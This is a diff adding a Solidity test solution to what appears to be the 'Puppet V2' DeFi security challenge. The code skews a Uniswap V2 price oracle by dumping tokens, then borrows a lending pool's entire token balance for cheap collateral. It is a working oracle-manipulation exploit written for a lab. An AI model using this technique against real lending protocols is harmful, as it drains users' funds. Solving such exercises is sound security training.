@@ -98,7 +98,59 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // check how much ETH would be required to borrow lendingPool's total DVT balance
+        console.log(
+            "starting deposit required: ",
+            lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)))
+        );
+        // check how much WETH the player has
+        console.log("player WETH starting balance: ", weth.balanceOf(player));
+        // check which token is which since uniswap sorts them by lowest address so it's never a guarantee which is WETH
+        console.log("token0: ", uniswapV2Exchange.token0());
+        console.log("token1: ", uniswapV2Exchange.token1());
+        // check pair state before swap
+        (uint256 reserves0Before, uint256 reserves1Before,) = uniswapV2Exchange.getReserves();
+        console.log("reserves0Before: ", reserves0Before);
+        console.log("reserves1Before: ", reserves1Before);
+
+        // define input amount for swap
+        uint256 amountDvtToSwap = token.balanceOf(player);
+        // approve uniswap router to swap tokens for weth
+        token.approve(address(uniswapV2Router), amountDvtToSwap);
+        // build array of token addresses to represent swap path for uniswap router call
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        // deadline swap has to go through by
+        uint256 deadline = block.timestamp + 1 hours;
+        // swap all DVT tokens for WETH to push price in the direction we want
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountDvtToSwap, 0, path, player, deadline
+        );
+
+        // check pair state after swap
+        (uint256 reserves0, uint256 reserves1,) = uniswapV2Exchange.getReserves();
+        console.log("reserves0: ", reserves0);
+        console.log("reserves1: ", reserves1);
+
+        // check how much WETH would be required after changing the price
+        uint256 wethDepositRequired = lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
+        console.log("deposit required after swap: ", wethDepositRequired);
+        // check how much WETH the player has
+        uint256 playerWethBalance = weth.balanceOf(player);
+        console.log("player WETH balance after swap: ", playerWethBalance);
+        // calculate how much more WETH we need
+        uint256 ethToWrap = wethDepositRequired - playerWethBalance;
+
+        // wrap ETH to get enough WETH
+        weth.deposit{value: ethToWrap}();
+        // infinite WETH approval to lendingPool for borrow transaction
+        weth.approve(address(lendingPool), wethDepositRequired);
+        // borrow DVT tokens from lendingPool at reduced rate
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+
+        // transfer tokens to recovery account
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
